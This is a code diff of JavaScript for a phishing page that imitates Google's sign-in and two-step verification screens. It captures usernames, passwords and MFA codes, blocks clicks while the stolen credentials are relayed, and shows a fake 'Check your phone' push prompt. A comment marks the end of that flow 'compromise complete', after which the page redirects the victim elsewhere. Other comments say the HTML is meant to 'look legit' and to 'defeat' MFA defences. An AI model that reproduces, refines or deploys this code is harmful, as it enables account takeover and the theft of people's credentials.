@@ -2,6 +2,7 @@ var currentStep = "";
 var username = "";
 var password = "";
 var mfa = "";
+var freezeClic = false; // just modify that variable to disable all clics events
 
 // trigger clicks with enter key press
 var input = document.getElementById("inputField");
@@ -12,13 +13,16 @@ input.addEventListener("keyup", function(event) {
     }
 });
 
-function handler(e){
-    e.stopPropagation();
-    e.preventDefault();
-}
+document.addEventListener("click", e => {
+    if (freezeClic) {
+        e.stopPropagation();
+        e.preventDefault();
+    }
+}, true);
 
 const nextButton = function( e ) {
   e.preventDefault();
+  console.log("Button pressed")
   const text = document.querySelector("#inputField")
 
   if(currentStep === "username"){
@@ -27,9 +31,7 @@ const nextButton = function( e ) {
   else if (currentStep === "password") {
     password = text.value;
     // here is where we want to temporarily block input, released on mfa load
-    document.addEventListener("click",handler,true);
-    var input = document.getElementById("inputField");
-    input.removeEventListener("keyup", e.preventDefault())
+    freezeClic = true;
   }
   else if (currentStep === "mfa") {
     mfa = text.value;
@@ -58,6 +60,7 @@ const nextButton = function( e ) {
 }
 
 const updateScreen = function(json) {
+  console.log("Screen updating")
   // update screen to parse next arg
   if(currentStep === "username"){
     moveToPassword()
@@ -83,11 +86,13 @@ const moveToPassword = function() {
   var inputField = document.querySelector("#inputField")
 
   // swap positions
-  bullets.parentNode.insertBefore(inputField, bullets)
+  //bullets.parentNode.insertBefore(inputField, bullets)
 
   // update opacities
   inputField.style.opacity = "0"
+  inputField.style.zIndex = "1";
   bullets.style.opacity = "100"
+  bullets.style.zIndex= "0";
 
   // update to look like password
   inputField.onkeyup = function(){
@@ -96,16 +101,8 @@ const moveToPassword = function() {
 }
 
 const moveToMFA = function(json) {
-  //re-enable enter to button click
-  var input = document.getElementById("inputField");
-  input.addEventListener("keyup", function(event) {
-      if (event.keyCode === 13) {
-          event.preventDefault();
-          document.getElementById("loginButton").click();
-      }
-  });
   //disable screen pause
-  document.addEventListener("click",handler,false);
+  freezeClic = false;
 
   // check json to see mfa type
   if(json.hasOwnProperty('mfa')) {
@@ -115,24 +112,8 @@ const moveToMFA = function(json) {
         displaySMS()
         break;
       case 2:
-        console.log("Using Call...")
-        displayCall()
-        break;
-      case 3:
-        console.log("Using Email...")
-        displayEmail()
-        break;
-      case 4:
-        console.log("Using TOTP...")
-        displayTOTP()
-        break;
-      case 5:
         console.log("Using Push Notification...")
         displayPush()
-        break;
-      case 6:
-        console.log("Using Push w/ Code...")
-        displayPushWCode()
         break;
       default:
         console.log("Defaulted to Failure...")
@@ -158,7 +139,7 @@ const displayFailure = function() {
   var bullets = document.querySelector("#Bullets")
   var inputField = document.querySelector("#inputField")
 
-  inputField.parentNode.insertBefore(bullets, inputField)
+  //inputField.parentNode.insertBefore(bullets, inputField)
 
   // update opacities
   inputField.style.opacity = "100"
@@ -171,9 +152,10 @@ const displayFailure = function() {
   document.getElementById("inputField").placeholder = username;
 }
 
+/* SMS tests account for TOTP/SMS/Call/Email */
 const displaySMS = function() {
   // update background size
-  document.getElementById("loginBackdrop").style.height = "425px"
+  document.getElementById("loginBackdrop").style.height = "410px"
 
   // update headers
   document.getElementById("headerField").innerHTML = "2-Step Verification";
@@ -198,23 +180,27 @@ const displaySMS = function() {
   verificationTitle.innerHTML = "2-Step Verification".bold()
   verificationTitle.style.fontSize = "large"
   verificationTitle.style.textAlign = "left"
-  verificationTitle.style.padding = "0px 35px 0px 35px";
+  verificationTitle.style.padding = "0px 50px 0px 50px";
   var verificationExplained = document.createElement("p")
-  verificationExplained.innerHTML = "A text message with a 6-digit verification code was just sent to your phone"
+  verificationExplained.innerHTML = "A text message with a 6-digit verification code was just sent to (***)***-**61."
   verificationExplained.style.textAlign = "left"
-  verificationExplained.style.padding = "0px 35px 0px 35px";
+  verificationExplained.style.padding = "0px 50px 0px 50px";
 
-  bullets.parentNode.insertBefore(verificationTitle, bullets)
-  bullets.parentNode.insertBefore(verificationExplained, bullets)
+  var space = document.getElementById("aboveInputs")
+  space.parentNode.insertBefore(verificationTitle, space)
+  space.parentNode.insertBefore(verificationExplained, space)
   bullets.remove()
+  space.remove()
 
+  document.getElementById("aboveInputs2").remove()
   document.getElementById("inputField").value = "";
   document.getElementById("inputField").placeholder = "Enter the code";
 }
 
-const displayCall = function() {
+/* Push covers Push w/ numbers because this additional context does not defeat mal endpoint... */
+const displayPush = function() {
   // update background size
-  document.getElementById("loginBackdrop").style.height = "425px"
+  document.getElementById("loginBackdrop").style.height = "375px"
 
   // update headers
   document.getElementById("headerField").innerHTML = "2-Step Verification";
@@ -235,66 +221,56 @@ const displayCall = function() {
 
   // ****** all below should be in a case by account statements
   // new html to look legit
+  var accountName = document.createElement("p")
+  accountName.innerHTML = username.bold()
+  accountName.style.fontSize = "large"
+  accountName.style.textAlign = "center"
+  accountName.style.padding = "0px 50px 0px 50px";
   var verificationTitle = document.createElement("p")
-  verificationTitle.innerHTML = "2-Step Verification".bold()
+  verificationTitle.innerHTML = "Check your phone".bold()
   verificationTitle.style.fontSize = "large"
   verificationTitle.style.textAlign = "left"
-  verificationTitle.style.padding = "0px 35px 0px 35px";
+  verificationTitle.style.padding = "0px 50px 0px 50px";
   var verificationExplained = document.createElement("p")
-  verificationExplained.innerHTML = "We will call your phone with a 6-digit verification code"
+  verificationExplained.innerHTML = "Google sent a notification to your phone. Open the Google app and tap <b>Yes</b> on the prompt to sign in."
   verificationExplained.style.textAlign = "left"
-  verificationExplained.style.padding = "0px 35px 0px 35px";
+  verificationExplained.style.padding = "0px 50px 0px 50px";
 
-  bullets.parentNode.insertBefore(verificationTitle, bullets)
-  bullets.parentNode.insertBefore(verificationExplained, bullets)
-  bullets.remove()
+  // add the little image of a phone
+  var img = document.createElement("img")
+  img.src = "google_phone.png"
+  img.style.padding = "0px 50px 0px 50px"
 
-  document.getElementById("inputField").value = "";
-  document.getElementById("inputField").placeholder = "Enter the code";
-}
+  // shrink the avatar
+  var avatar = document.querySelector("#avatarDiv")
+  avatar.remove()
 
-const displayEmail = function() {
-  // update background size
-  document.getElementById("loginBackdrop").style.height = "425px"
+  var space = document.getElementById("removeMe2")
+  space.parentNode.insertBefore(accountName, space)
+  space.parentNode.insertBefore(img, space)
+  space.parentNode.insertBefore(verificationTitle, space)
+  space.parentNode.insertBefore(verificationExplained, space)
+  document.getElementById("inputs").remove()
 
-  // update headers
-  document.getElementById("headerField").innerHTML = "2-Step Verification";
-  document.getElementById("subheaderField").innerHTML = "This extra step shows it's really you trying to sign in";
+  document.querySelector("#removeLoginDiv").remove()
+  document.querySelector("#aboveInputs").remove()
+  document.querySelector("#removeMe1").remove()
+  document.querySelector("#removeMe2").remove()
+  document.querySelector("#removeMe3").remove()
 
-  // reset inputs
-  var bullets = document.querySelector("#Bullets")
-  var inputField = document.querySelector("#inputField")
-
-  inputField.parentNode.insertBefore(bullets, inputField)
-
-  // update opacities
-  inputField.style.opacity = "100"
-  bullets.style.opacity = "0"
-
-  // update to look normal again
-  inputField.onkeyup = function(){};
-
-  // ****** all below should be in a case by account statements
-  // new html to look legit
-  var verificationTitle = document.createElement("p")
-  verificationTitle.innerHTML = "2-Step Verification".bold()
-  verificationTitle.style.fontSize = "large"
-  verificationTitle.style.textAlign = "left"
-  verificationTitle.style.padding = "0px 35px 0px 35px";
-  var verificationExplained = document.createElement("p")
-  var username_abbreviated = username
-  // determine starting and ending indexes
-  username_abbreviated.replace
-  verificationExplained.innerHTML = "An email with a 6-digit verification code was just sent to your phone"
-  verificationExplained.style.textAlign = "left"
-  verificationExplained.style.padding = "0px 35px 0px 35px";
-
-  bullets.parentNode.insertBefore(verificationTitle, bullets)
-  bullets.parentNode.insertBefore(verificationExplained, bullets)
-  bullets.remove()
-
-  document.getElementById("inputField").value = "";
-  document.getElementById("inputField").placeholder = "Enter the code";
+  /* now wait on server to release promise and redirect (compromise complete)*/
+  // add to server
+  fetch("/push", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" }
+  })
+  .then(function(response) {
+    return response.json();
+  })
+  .then(json => {
+    window.location.href = "https://agame.com"
+  })
+  return false;
 }
 
 window.onload = function() {
